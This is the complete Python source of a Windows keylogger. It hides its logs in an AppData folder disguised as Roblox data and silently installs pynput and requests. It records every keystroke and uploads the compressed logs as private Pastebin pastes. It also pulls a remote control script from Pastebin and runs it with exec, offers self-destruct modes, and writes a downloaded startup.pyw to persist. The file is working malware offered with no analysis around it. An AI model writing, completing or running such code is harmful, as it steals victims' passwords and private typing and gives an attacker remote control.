import os
import time
import sys
import getpass
import shutil
import random
import zlib

usr = getpass.getuser()
cpath = f"C:/Users/{usr}/AppData/Roaming/.rbx/roblox"

try:
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime
except ImportError:
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install requests -q")
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install pynput -q")
    os.system(f"C:\\Users\\{usr}\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install datetime -q")
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime

if os.path.exists(cpath+"/PBIN_CREDS.bin"):
    with open(cpath+"/PBIN_CREDS.bin","r") as creds:
        exec(creds.read())

def check():
    if not os.path.exists(cpath+"/.."):
        os.mkdir(cpath+"/..")
    
    if not os.path.exists(cpath):
        os.mkdir(cpath)
 
    if not os.path.exists(cpath+"/download"):
        os.mkdir(cpath+"/download")
 
    if not os.path.exists(cpath+"/PBIN_CREDS.bin"):
        pass_keys = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
"1","2","3","4","5","6","7","8","9","0"]
        i,devid = 0,""
        while i < 8:
            devid += pass_keys[random.randint(1,len(pass_keys))]
            i += 1
        with open(cpath+"/PBIN_CREDS.bin","w") as creds:
            creds.write("key = 'YOUR_KEY_FROM_https://pastebin.com/doc_api'\nusername = 'YOUR_PASTEBIN_USERNAME'\npassword = 'YOUR_PASTEBIN_PASSWORD'\ndevid = '"+devid+"'")
            creds.close()

def send():
    if os.path.exists(cpath+"/download/data-current.bin"):
        try:
            i,string = 0,""
            while os.path.exists(cpath+"/download/asset"+str(i)+".bin"):
                string += open(cpath+"/download/asset"+str(i)+".bin").read().replace("\n","")
                i += 1
            string += open(cpath+"/download/data-current.bin","r").read().replace("\n","")
            string = string.replace("  "," ")
 
            login_data = {
                'api_dev_key': key,
                'api_user_name': username,
                'api_user_password': password
            }
            data = {
                'api_option': 'paste',
                'api_dev_key': key,
                'api_paste_code':str(eval("zlib.compress(b'"+string+"')")),
                'api_paste_name':"KEYLOG ["+datetime.now().strftime("%m/%d/%Y @ %I:%M:%S %p")+" | id: "+devid+"]",
                'api_paste_expire_date': 'N',
                'api_user_key': None,
                'api_paste_private': '2'
            }
 
            login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
            data['api_user_key'] = login.text
            r = requests.post("https://pastebin.com/api/api_post.php", data=data)
            if os.path.exists(cpath+"/download"):
                shutil.rmtree(cpath+"/download")
        except:
            pass

def update():
    b = requests.get("https://pastebin.com/raw/igs9Xp2k", timeout=30)
    if b.status_code != 404:
        try:
            with open("startup.pyw","wb") as kylgr:
                kylgr.write(b.content)
                kylgr.close()
        except:
            pass

a = requests.get("https://pastebin.com/raw/kctGFQS5", timeout=30)
if a.status_code != 404:
    try:
        exec(a.content)
        if autoupdate == True and operating != False:
            update()
        if operating == "off_temporary":
            raise SystemExit
        if operating == "off_delete_logs":
            if os.path.exists(cpath+"/download"): shutil.rmtree(cpath+"/download")
            raise SystemExit
        if operating == "off_send_logs":
            send()
            raise SystemExit
        if operating == "destruct":
            if os.path.exists("startup.pyw"): os.remove("startup.pyw")
            if os.path.exists(cpath): shutil.rmtree(cpath)
            if os.path.exists(cpath+"/.."): shutil.rmtree(cpath+"/..")
            raise SystemExit
        if operating == "destruct_send_logs":
            send()
            if os.path.exists("startup.pyw"): os.remove("startup.pyw")
            if os.path.exists(cpath): shutil.rmtree(cpath)
            if os.path.exists(cpath+"/.."): shutil.rmtree(cpath+"/..")
            raise SystemExit
    except Exception as e:
        pass
else:
    update()

check()
send()
check()
def on_press(key):
    raw = open(cpath+"/download/data-current.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key."," ")+" \n")
    else:
        raw.write(str(key).replace("'","")+"\n")
    raw.close()
 
    if len(open(cpath+"/download/data-current.bin","r").read().split("\n")) >= 101:
        i = 0
        while os.path.exists(cpath+"/download/asset"+str(i)+".bin"):
            i += 1
        shutil.copy(cpath+"/download/data-current.bin", cpath+"/download/asset"+str(i)+".bin")
        with open(cpath+"/download/data-current.bin","w") as temp:
            temp.write("")
            temp.close()
 
with Listener(on_press=on_press) as listen:
    listen.join()
 
while True:
    time.sleep(0.1)